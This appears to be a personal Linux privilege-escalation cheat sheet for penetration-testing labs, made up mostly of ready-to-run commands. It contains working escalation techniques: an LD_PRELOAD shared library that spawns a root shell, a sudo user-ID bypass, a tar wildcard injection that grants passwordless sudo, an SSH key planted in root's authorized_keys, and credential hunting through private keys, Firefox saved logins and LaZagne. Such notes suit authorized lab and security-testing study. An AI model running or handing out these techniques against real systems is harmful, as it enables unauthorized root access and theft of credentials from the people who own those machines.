# Permission-based
## Group Memberships
Interesting groups to be part of:
- LXC / LXD
- Docker
- Disk
- ADM
## Capabilities
Grants specific privileges(s) to processes.
### Enumerate Capabilities
```shell-session
$ find $(echo $PATH | tr ':' ' ') -type f -exec getcap {} \;
```
## User Privileges
1. Sudo
2. SUID
3. Windows Token Privileges
### Sudo
Check for sudo abuse.
```shell-session
$ sudo -l
```
- Run sudo as another user
It was a vulnerability. Use user ID to 
```shell-session
$ sudo -u#-1 id
```
### Sudoers
If the file `etc/sudoers` /could be made editable (for example using `setfacl`, add sudo privileges directly and `sudo su` to get root.
```bash
setfacl -m u:$USER:$perm /etc/sudoers
```
if `setfacl` can be run as sudo from low_priv user.
## Shared Object Hijacking
Executables with custom loaded libraries with improper permissions can allow us to create our own libraries to be linked with the program. Similar to [[#`env_keep+=LD_PRELOAD`|LD Preload]] below
```shell-session
$ ldd <executable>
$ readelf -d <executable>  | grep PATH
```
### Python Library Hijacking
3 basic vulnerabilities where we can hijack:
1. Wrong write permissions
```shell-session
$ pip3 show <module>
```
2. Library Path
3. PYTHONPATH environment variable
```shell-session
$ python3 -c 'import sys; print("\n".join(sys.path))'
```
## Writeable Files/Directories
```shell-session
$ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
```
## SSH Keys
If we have read/write access on **`.ssh`**  directory, we can get/create SSH connection.

Generate public-private key and paste the public in server
```bash
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Or we can find SSH keys:
- Private Keys
```shell-session
$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
- Public Keys
```shell-session
$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
# Information Gathering
## OS Info
```shell-session
$ cat /etc/os-release
$ cat /etc/lsb-release
```
## System Path
```shell-session
$ echo $PATH
```
## Environment Variables
```shell-session
$ env
```
### `env_keep+=LD_PRELOAD`
If we can run any one command as root with this environment variable, we can load our own malicious shared library here.
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell-session
$ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
$ sudo LD_PRELOAD=exploit.so <COMMAND>
```
## Environment
```shell-session
$ uname -a
$ lscpu
$ lsblk
$ cat /etc/shells
$ cat /etc/fstab
$ route

$ cat `/etc/resolv.conf`                  # Private DNS?
```
## Installed Applications
```shell-session
$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
$ sudo -V
```
## Hidden Files/Directories
```shell-session
$ find / -type <f/d> -name ".*" -ls 2>/dev/null
```
## History Files
```shell-session
$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
## Temporary Files
```shell-session
$ ls -l /tmp /var/tmp /dev/shm
```
## Configuration Files
```shell-session
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
## SetUID/SetGID
```shell-session
$ find / -user root -perm -<4/6>000 -exec ls -ldb {} \; 2>/dev/null
```

# Credential Hunting
## SSH Keys
We can find SSH keys:
- Private Keys
```shell-session
$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
- Public Keys
```shell-session
$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
## Browsers
### Firefox
`Firefox` stores the credentials encrypted in a hidden folder for the respective user. Often including the associated field names, URLs, and other information. For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json`
```shell-session
$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
#### Tools
- [[Firefox Decrypt]]
## Memory & Cache
### Tools
- [[mimipenguin]]
- [[LaZagne]]
```shell-session
$ sudo python2.7 laZagne.py all
```
## Processes
Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
## Passive Traffic Capture
If `tcpdump` installed, can try to sniff traffic to get any cleartext data. Can use tools like:
- [net-creds](https://github.com/DanMcInerney/net-creds)
- [PCredz](https://github.com/lgandx/PCredz)

# Service-based
## Logrotate
## LXD
## Docker
## Cron
1. **`/etc/crontab`**
2. **`/etc/cron.d`**
3. **`/etc/cron.daily/`**
4. **`/var/spool/cron/crontabs/root`**
## Tmux
A user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions. This may be done by creating a new shared session and modifying the ownership.

Need to compromise a user in the `dev` group
```shell-session
$ tmux -S /shareds new -s debugsess
$ chown root:devs /shareds

#If we can compromise a user in the `dev` group, 
#we can attach to this session and gain root access.

$  ps aux | grep tmux
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess

$ ls -la /shareds 
srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

$ tmux -S /shareds
```
# [[Databases]]
# Wildcard Abuse
When certain applications are run with wildcards, they can be abused:
Example:
```c
# cron job
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
```shell-session
$ echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1
```
This will replace the wildcard with these files which will act as flags for the `tar` command in the cron job.
# Hardening Services
Look out for system defenses such as:
- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)
